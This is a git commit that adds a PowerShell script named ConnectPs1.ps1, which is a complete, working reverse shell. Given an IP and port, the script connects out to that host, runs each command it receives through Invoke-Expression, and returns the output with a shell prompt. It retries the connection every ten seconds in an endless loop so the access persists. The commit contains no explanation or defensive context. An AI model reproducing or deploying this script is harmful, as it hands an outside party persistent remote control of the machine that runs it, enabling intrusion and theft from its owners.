213f76205cb9637467744401bbef15f22cf4630b
initial-doomer <initial.gamefowl@protonmail.com>
2025-10-07 20:11:28 +0530

    Add files via upload

---
+++ ConnectPs1.ps1
@@ -0,0 +1,31 @@
+param(
+    [string]$IP = $args[0],
+    [int]$PORT = $args[1]
+)
+
+while ($true) {
+    try {
+        # This is the corrected line
+        $client = New-Object System.Net.Sockets.TCPClient($IP, $PORT)
+        
+                    $stream = $client.GetStream()
+                    $bytes = New-Object byte[] 65535
+                    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+                        $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i).Trim()
+                        if ($data -eq "exit") {
+                            $client.Close()
+                            exit
+                        }
+                        $sendback = ""
+                        if ($data) {
+                            $sendback = try { Invoke-Expression $data 2>&1 | Out-String } catch { $_.ToString() }
+                        }
+                        $sendbytes = ([System.Text.Encoding]::ASCII).GetBytes($sendback + "PS " + (Get-Location).Path + "> ")
+                        $stream.Write($sendbytes, 0, $sendbytes.Length)
+                        $stream.Flush()
+                    }        $client.Close()
+        Start-Sleep -Seconds 10
+    } catch {
+        Start-Sleep -Seconds 10
+    }
+}
